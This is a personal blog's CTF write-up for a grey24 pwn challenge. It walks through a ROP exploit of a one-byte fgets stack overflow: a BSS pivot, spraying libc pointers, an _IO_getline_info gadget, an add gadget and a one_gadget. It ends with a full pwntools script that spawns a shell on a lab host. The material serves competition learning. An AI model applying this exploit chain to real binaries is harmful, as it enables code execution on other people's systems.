---
layout: post
title: grey/overly simplified pwn challenge
date: 2026-04-01 05:40:00 +0800
---

[recommended listening fill in the blank by car seat headrest](https://www.youtube.com/watch?v=s_a1hPwXiWw)
![img](https://i.imgur.com/cwdsObm.png)

> pwn/overly simplified pwn challenge
> 
> author: elma
> 
> solves: 2

guy who said he was gonna retire: ermmm let's upsolve some pwn

this is an old pwn challenge from grey24 (before i properly started ctf as a whole), here is my upsolve. i was drawn to this challenge because the intended solution is `ret2dlresolve`, a technique which i have never learned how to do and never will because i think it is inelegant and cringe. i wanted to see if it was possible to solve it without `ret2dlresolve`, and after 8 hours of suffering (1am - 5am, then woke up at 2pm and finished it) i managed to get a working solve on remote.

honestly i did not enjoy solving this challenge because i spent around 6 of those hours trying to coerce `one_gadget` constraints through various, increasingly psychotic methods which did not pan out, but that is a me problem! i think the challenge is really cool and forces you to _really_ squeeze water out a stone. one particular technique here i'd never used before and found fascinating (despite how finicky it was x_x)

the challenge is two lines of C code:

```c
#include <stdio.h>
int main(){char buf[1];return fgets(buf, 0x80, stdin);}
```

for these minimal ROP challenges, you are essentially forced to stare at the assembly - here is the disassembly for this `main()` function, we can see the stack allocations, the `fgets` call, and the `leave ; ret`.

```python
0000000000401136 <main>:
  401136:	f3 0f 1e fa          	endbr64
  40113a:	55                   	push   rbp
  40113b:	48 89 e5             	mov    rbp,rsp
  40113e:	48 83 ec 10          	sub    rsp,0x10
  401142:	48 8b 15 e7 2e 00 00 	mov    rdx,QWORD PTR [rip+0x2ee7]        # 404030 <stdin@GLIBC_2.2.5>
  401149:	48 8d 45 ff          	lea    rax,[rbp-0x1]
  40114d:	be 80 00 00 00       	mov    esi,0x80
  401152:	48 89 c7             	mov    rdi,rax
  401155:	e8 e6 fe ff ff       	call   401040 <fgets@plt>
  40115a:	c9                   	leave
  40115b:	c3                   	ret
```

the challenge is no PIE (important) and partial RELRO (important if you're solving with ret2dlresolve, but not important at all for our concerns). given the barebones nature of the code, the gadgets are also _very_ barebones: we have almost no direct register control aside from `rsp` (via `leave ; ret`) and `rbp`. what do we do?

first we'll need to know where things are, so we stack pivot into BSS (fairly standard). in this binary, BSS is located at `0x404400`, so we pivot out by overwriting `rbp` into a BSS address and overwriting `rsp` to the _middle_ of the `main` function, before the stack prologue.

the stack frame looks something like this:

```
0x00 <- single byte buf
0xcafebeefdeadbabe <- stored RBP
0xdeedfeedcacababa <- retaddr
0x... <- a further 0x6f bytes of buffer
```

note that because there is only a single byte of buffer, basically the first `0x10` bytes of our write will have to be "clobbered" with an `RBP` pointer and a valid `retaddr`. this is Annoyance Number One. Annoyance Number Two is the use of `fgets`, which terminates on a newline (if you ever have an `0xa` byte in your payload, fgets will interpret it as a newline and terminate your read xd), as well as nullterminating every single write. the nullterminator here is _especially_ annoying! but alas, we must work our way around it.

but okay, we can pivot out and get our bearings (and a consistent location for our writes that we can reference). what now?

### the profundity

`fgets`, despite its many annoyances, ends up being our saviour here. the execution of `fgets` ends up calling multiple different libc helper functions - the important thing here is that with function calls come new stack frames, and with new stack frames comes _new values written to the stack_, such as return addresses, stored temporary variables, callee-saved registers etc. to illustrate, let's look at the stack trace in the middle of an `fgets` call:

```c
------------------------------------------------------------------ trace ----
[*#0] 0x7f787a45641c <_IO_getline_info+0xac> (frame name: __GI__IO_getline_info)
[ #1] 0x7f787a45651c <NO_SYMBOL>
[ #2] 0x7f787a455410 <fgets+0x90> (frame name: _IO_fgets)
[ #3] 0x00000040115a <main+0x24>
[ #4] 0x7f787a3ffd90 <__libc_start_call_main+0x80>
[ #5] 0x7f787a3ffe40 <__libc_start_main+0x80> (frame name: __libc_start_main_impl)
[ #6] 0x000000401075 <_start+0x25>
-----------------------------------------------------------------------------
gef>
```

we can see that `fgets` calls `_IO_getline_info`. naturally, it would need to push the return address (`fgets+0x90`) to the stack, and since our stack is in BSS, that means _we would have valid libc pointers_ sprayed onto the BSS. this will essentially function as our 'leak' (in these minimal ROP challenges it's honestly a bit foolish to expect you get any 'proper' leaks).

seasoned pwn players will understand what you can do with these libc addrs: add gadgets!

```c
0x000000000040111c : add dword ptr [rbp - 0x3d], ebx ; nop ; ret
```

note this gadget, which adds a 32-bit value stored in `ebx` to a memory address stored in `rbp - 0x3d`. with both `rbp` and `ebx` control, we can arbitrarily add or subtract from values stored in a writable region of memory. so, theoretically, we could spray libc ptrs using an fgets call, and _then_ add a value to it to point to something useful (like a one gadget).

now, the issue: we don't have `ebx` control. we have trivial `rbp` control, sure, but nothing gives us control of `ebx`. no gadgets in the binary, not even any function calls that affect `ebx`. what is the plan now?

this part took quite a bit of thinking. we may want to SROP, but we have no syscalls anywhere in the binary, and we don't have `rax` control anyway. and i am purposefully eschewing `ret2dlresolve` here. the answer, once again, comes in the form of the addresses sprayed by `fgets`!

### examining the addresses

what i did at this stage in the challenge is just spam random calls to `fgets` (we return to the middle of the `main()` function by overwriting the retaddr but don't do anything else otherwise):

```c
payload = b'\x00'
payload += p64(0x404990)
payload += p64(WRITE)
p.sendline(payload)

payload = b'\x00'
payload += p64(0x404500)
payload += p64(WRITE)
p.sendline(payload)

payload = b'\x00'
payload += p64(0x404da0) # next rbp
payload += p64(WRITE)
```

afterwards i just eyepowered the `bss` region for interesting pointers, `bata24`'s `gef` makes this easy:

```c
[+] Searching for addresses in 'challenge' that point to 'libc'
challenge: 0x0000000000403ff0  ->  0x00007f7fc2f34dc0 <__libc_start_main>  ->  0x89495741fa1e0ff3
challenge: 0x0000000000404018 <fgets@got[plt]>  ->  0x00007f7fc2f8a380 <fgets>  ->  0x55415641fa1e0ff3
challenge: 0x0000000000404030 <stdin@GLIBC_2.2.5>  ->  0x00007f7fc3125aa0 <_IO_2_1_stdin_>  ->  0x00000000fbad2088
challenge: 0x0000000000404908  ->  0x00007f7fc2f8b494 <_IO_getline_info+0x124>  ->  0x448d4808244c8b48
challenge: 0x0000000000404940  ->  0x00007f7fc3125aa0 <_IO_2_1_stdin_>  ->  0x00000000fbad2088
challenge: 0x0000000000404968  ->  0x00007f7fc2f8a410 <fgets+0x90>  ->  0x8548f6314500558b
challenge: 0x0000000000404d60  ->  0x00007f7fc2f8b494 <_IO_getline_info+0x124>  ->  0x448d4808244c8b48
challenge: 0x0000000000404d80  ->  0x00007f7fc2f8b494 <_IO_getline_info+0x124>  ->  0x448d4808244c8b48
challenge: 0x0000000000404db8  ->  0x00007f7fc3125aa0 <_IO_2_1_stdin_>  ->  0x00000000fbad2088
challenge: 0x0000000000404de0  ->  0x00007f7fc2f8a410 <fgets+0x90>  ->  0x8548f6314500558b
gef>
```

we can see cool stuff here - there's pointers to `stdin`, but more importantly, this `_IO_getline_info+0x124` function. we can disassemble the instructions pointed to by that function, and see:

```c
gef> x/16i 0x00007f7fc2f8b494
   0x7f7fc2f8b494 <__GI__IO_getline_info+292>:	mov    rcx,QWORD PTR [rsp+0x8]
   0x7f7fc2f8b499 <__GI__IO_getline_info+297>:	lea    rax,[rbp+rbx*1+0x0]
   0x7f7fc2f8b49e <__GI__IO_getline_info+302>:	mov    QWORD PTR [r12+0x8],rcx
   0x7f7fc2f8b4a3 <__GI__IO_getline_info+307>:	add    rsp,0x28
   0x7f7fc2f8b4a7 <__GI__IO_getline_info+311>:	pop    rbx
   0x7f7fc2f8b4a8 <__GI__IO_getline_info+312>:	pop    rbp
   0x7f7fc2f8b4a9 <__GI__IO_getline_info+313>:	pop    r12
   0x7f7fc2f8b4ab <__GI__IO_getline_info+315>:	pop    r13
   0x7f7fc2f8b4ad <__GI__IO_getline_info+317>:	pop    r14
   0x7f7fc2f8b4af <__GI__IO_getline_info+319>:	pop    r15
   0x7f7fc2f8b4b1 <__GI__IO_getline_info+321>:	ret
```

whoa! this is `rbx`, `rbp` as well as `r12-15` control?? for free!

### a quick aside

this gadget is also actually `rcx` control by way of `mov rcx, QWORD PTR [rsp+0x8]` - this is something i only realised now while writing this xd. for around an hour during this challenge, i wanted to do something with the following gadgets:

```c
(base) wrenches@kitty (ork/pwn/overly-simplified) > ROPgadget --binary=main | grep cx 
0x000000000040111b : add byte ptr [rcx], al ; pop rbp ; ret
0x0000000000401159 : dec ecx ; ret
```

we technically _do_ have limited `rcx` control by way of `fgets`, which stores a ptr to the last byte of buffer written in both `rax` and `rcx`. my initial idea was to leverage this control by writing just a _bit_ below a libc addr we wanted to modify, chaining `dec ecx` to decrement it to point to the libc addr itself, and then calling the `add byte ptr` gadget. i have actually been able to use this `add byte ptr` gadget before, although not in such a roundabout way.

at some point doing these challenges you kind of get so fucking lost in the sauce trying to construct these absurd situations that you often forget a far easier way to go about things. i'm not even going to say that this `IO_getline_info` gadget is _at all_ straightforward to think of using, but it's a lot simpler to actually use. note that because the _same_ value is in `rcx` and `rax`, and you are using the (least-significant byte) value of `rax` to add to the value pointed at by `ecx`, you would need to _very specifically_ control where you even put what you want to modify! that's not really something we can do with any sort of finesse given we're just spraying the gadgets at random.

but yeah holy shit it's just crazy what your brain can come up with at 3am. it certainly Is possible to get this to work (believe me i got like 70% of the way there!). in some sense this is like impressionism, or pointillism, or rather the opposite - you get so caught up in the tiny details of execution, these small little dots of the canvas, that you forget about the actual end goal.

what im trying to say is that im basically Monet and these schizophrenic 6-eye ropfu chains are my Impression, Sunrise

### back to it

going back to the gadget, let's think about how we can even end up ropchaining to it. we can do so by exploiting our `rbp` control and `leave ; ret`.

```c
0x000000404d70|+0x0000|+000: 0x0000000012cf12c4 (we `pop rbp` to point here, and then call `leave`)
0x000000404d78|+0x0008|+001: 0x0000000100000000 (`leave` will re-pop the rbp value here)
0x000000404d80|+0x0010|+002: 0x00007f7fc2f8b494 <_IO_getline_info+0x124> (where we want to ret)
0x000000404d88|+0x0018|+003: 0x0000000000000000 <- the value of RSP as we go through the gadget
```

but let's take a look at that gadget again, specifically, the `add rsp, 0x28` instruction. this means that our value for `rbx` has to be `0x28` below the value of RSP as we go through, so actually we need the layout to look more like this:

```c
0x000000404d70|+0x0000|+000: 0x0000000012cf12c4 <- initial value of rbp before we leave ; ret
0x000000404d78|+0x0008|+001: 0x0000000100000000
0x000000404d80|+0x0010|+002: 0x00007f7fc2f8b494 <_IO_getline_info+0x124>  ->  0x448d4808244c8b48
0x000000404d88|+0x0018|+003: 0x0000000000000000 <- RSP
0x000000404d90|+0x0020|+004: 0x0000000012cf12d6
0x000000404d98|+0x0028|+005: 0x00000001c3125aa0
0x000000404da0|+0x0030|+006: 0x0000000000000000
0x000000404da8|+0x0038|+007: 0x0000000000000000
0x000000404db0|+0x0040|+008: 0x0000000000000080
0x000000404db8|+0x0048|+009: 0x00007f7fc3125aa0 <- rbx
0x000000404dc0|+0x0050|+010: 0x000000000040498f <- rbp
0x000000404dc8|+0x0058|+011: 0x0000000000000000 <- r12
0x000000404dd0|+0x0060|+012: 0x0000000000403e18 <- r13
0x000000404dd8|+0x0068|+013: 0x00007f7fc317c040 <- r14
0x000000404de0|+0x0070|+014: 0x00007f7fc2f8a410 <- r15
0x000000404de8|+0x0078|+015: 0x0000000000000000 <- retaddr
0x000000404df0|+0x0080|+016: 0x0000000000404990
```

this is just enough to do in one `0x80` write. we point `rbp` at anywhere after `0xd80` and set-up the values accordingly. also note that the 'scratch' space we get in the middle of our controlled registers and the `getline_info` gadget is actually really useful, because we need to dump our initial chain's stored `rbp` and `retaddr` somewhere.*

* (another brief aside - i actually was trying to use the add gadget twice, once to increment to one-gadget, another to point to a `libc` gadget that would allow me to modify `rdi` to null to meet one-gadget constraints, and the fact that the first `0x10` bytes of write _need_ to be our `rbp` and `retaddr` completely botched this idea).

### one-gadgets

typing in `one` in `bata24`'s `gef` lets us see potential one-gadgets. i ended up using this one, because of our `r12` and `r13` control, and its loose constraints.

```c
0xebce2 execve("/bin/sh", rbp-0x50, r12)
constraints:
  address rbp-0x48 is writable
  r13 == NULL || {"/bin/sh", r13, NULL} is a valid argv
  [r12] == NULL || r12 == NULL || r12 is a valid envp
```

just out of curiosity let's actually look at the asm behind the one-gadget (because i fucking had to do this for about six hours after very foolishly trying other gadgets that didn't work and i want to share this information somehow). i think a lot of us tend to treat one-gadgets as something you can anyhow dogshit whack but it is nice to gain an intuition for how these work under the hood:

```c
gef> x/16i $libc+0xebce2
   0x7f7fc2ff6ce2 <__execvpe+1234>:	lea    r14,[rip+0xec98f]        # 0x7f7fc30e3678 (/bin/sh)
   0x7f7fc2ff6ce9 <__execvpe+1241>:	mov    QWORD PTR [rbp-0x48],r13
   0x7f7fc2ff6ced <__execvpe+1245>:	lea    r8,[rbp-0x50]
   0x7f7fc2ff6cf1 <__execvpe+1249>:	mov    QWORD PTR [rbp-0x50],r14
   0x7f7fc2ff6cf5 <__execvpe+1253>:	jmp    0x7f7fc2ff6a90 <__execvpe+640>
   [jmp]
   0x7f7fc2ff6a90 <__execvpe+640>:	mov    QWORD PTR [r8+0x10],0x0
   0x7f7fc2ff6a98 <__execvpe+648>:	mov    rdx,r12
   0x7f7fc2ff6a9b <__execvpe+651>:	mov    rsi,r8
   0x7f7fc2ff6a9e <__execvpe+654>:	mov    rdi,r14
   0x7f7fc2ff6aa1 <__execvpe+657>:	call   0x7f7fc2ff6080 <execve>
```

typically, one_gadgets are just offsets to some existing libc function that already calls `execve` or `posix_spawn`, and by jumping into the middle of them with certain register values, we can manipulate the register setup that these functions perform to prepare the relevant calls. note here that `rdi` comes from `r14`, which the function already loads with a `/bin/sh` string for free, so we don't need to put `/bin/sh` anywhere. further note that the reason we require `r13` to be null is because we are placing its value at `rbp - 0x48`, which eventually gets parsed as `execve`'s `argv`. similarly, `r12` must be null because it's what eventually becomes the `env` value.

to be honest i just think this is neat :)

### actually add-gadgeting

now we need a target to properly perform the `add` onto. surprisingly, there is one constraint that proves to be the most problematic, counter intuitively: it's the constraint on `rbp`! recall that since the way we eventually call the `add` gadget is with a `leave ; ret`, the value directly _before_ the gadget address gets popped into rbp.

```c
0x404d00: 0x00                  <- initial value of rbp
0x404d08: 0xcafebabe            <- new value of rbp
0x404d10: 0x7f[one_gadget_addr] 
```

what does this mean? it means that counterintuitively, we actually _don't_ have control of `rbp` before we hop into the one-gadget. either we can use another write to fill that space (which is kind of annoying), or we can just... spray more libc pointers and pray that one of them has a valid address we can use as an `rbp` value directly before. keep in mind we can choose to `add` to any libc pointer in bss, so... just spam more nonsense writes :)

```c
0x000000404da8|+0x00a8|+021: 0x0000000000000000
0x000000404db0|+0x00b0|+022: 0x0000000000000007
0x000000404db8|+0x00b8|+023: 0x0000000000404b00 <- valid rbp pointer that happened to exist, by the grace of God
0x000000404dc0|+0x00c0|+024: 0x00007f7fc2ff6ce2 <- libc pointer
```

in my solve it just happened to be at `0x404dc0`, so after we perform the `add` gadgeting, we can just point `rbp` at `0x404db0`, call a `leave ; ret`, and win!

here's the full solvescript.

```python
WRITE           = 0x401142
LEAVE           = 0x40115a
ADD_GAD         = 0x40111c
POP_RBP         = 0x40111d

import time
l = lambda: 1

p = remote('172.17.0.3', 5000)
input('[!]')

#p = process()
# pivot RBP to BSS
payload = b'\x00'
payload += p64(0x404e00)
payload += p64(WRITE)

#l()
p.sendline(payload)

# move RSP to BSS
payload = b'\x00'
payload += p64(0x404da0)
payload += p64(exe.sym['main'])

l()
p.sendline(payload)

#payload += b'\x00'
#payload += p64(0x404a00)
#payload += p64(WRITE)

payload = b'\x00'
payload += p64(0x404990)
payload += p64(WRITE)

l()
p.sendline(payload)

payload = b'\x00'
payload += p64(0x404500)
payload += p64(WRITE)
l()
p.sendline(payload)

payload = b'\x00'
payload += p64(0x404da0) # next rbp
payload += p64(WRITE)

l()
p.sendline(payload)

payload = b'\x00'
payload += p64(0x404d78) # rbp, leave will eventually cause us to RET to the getline_info gad
payload += p64(LEAVE) # rsp
payload += p64(twos(0xebce2 - 0x7f410)) # rbx

payload += p64(0x404de0 + 0x3d)
payload += p64(0x0) + p64(0x0) + p64(0x7) + p64(0x404b00) # imagine
payload += p64(POP_RBP) + p64(0x404508) + p64(WRITE)

l()
p.sendline(payload)

payload = b'\x00'
payload += p64(0x404308) # rbp
payload += p64(WRITE)

l()
p.sendline(payload)

payload = b'\x00'
payload += p64(0x404e08)
payload += p64(WRITE)

l()
p.sendline(payload)

payload = b'\x00'
payload += p64(0x404dc0 + 0x3d) + p64(ADD_GAD)
payload += p64(POP_RBP) + p64(0x404dc0 - 0x08)
payload += p64(LEAVE)
l()
p.sendline(payload)

p.interactive()
```

### conclusion

i've always enjoyed challenges like these because it feels like building something together with legos, but the legos are all falling apart and also collapse under their own weight half the time, like if you put a lego on a certain piece it'll clobber some other brick 5 metres away and you'll have to spend 3 years debugging how that lego piece fucked everything all up and also since all of it is built already you have to carefully select what to tear down and what to keep. it's fun to see what works, fun to see what doesn't.

i also had a local solve at about 4pm and only managed to fix it at 520pm. the `fgets` shit is Very Finicky when you're debugging and at some points, the contents of my spray were absolutely not what i wanted them to be, despite nothing changing except for a debugger being attached. i ended up doing what i usually do for these challenges, which is installing gef into the provided Dockerfile and just painstakingly debugging from within the container itself.

additionally, what are the odds that we get such a useful gadget from `fgets` in the first place, huh??? initially there were some thoughts about partially overwriting the lsb of a libc ptr with a nullbyte and seeing if that pointed anywhere useful, but turns out it was completely fine and we didn't even have to modify the gadget.

of course, the reason we get this gadget in the first place is because it precedes a `call` instruction, which pushes its address onto the stack:

```c
   0x7f7fc2f8b48f <__GI__IO_getline_info+287>:	call   0x7f7fc2f33620 <*ABS*+0xa9c10@plt>
   0x7f7fc2f8b494 <__GI__IO_getline_info+292>:	mov    rcx,QWORD PTR [rsp+0x8]
   0x7f7fc2f8b499 <__GI__IO_getline_info+297>:	lea    rax,[rbp+rbx*1+0x0]
   0x7f7fc2f8b49e <__GI__IO_getline_info+302>:	mov    QWORD PTR [r12+0x8],rcx
   0x7f7fc2f8b4a3 <__GI__IO_getline_info+307>:	add    rsp,0x28
  ...
```

which just so happens to be before the function epilogue. neat!

thanks to elma for the nice challenge. also if you want to see what the `ret2dlresolve` solution looks like, ancient pwn sensei lucas samuzAura tan [has a great writeup on it](https://samuzora.com/posts/grey-finals-2024#overly-simplified-pwn-challenge). despite my gripes against the technique i do think there is a lot of profundity to be thought about regarding what to resolve and how to use it.


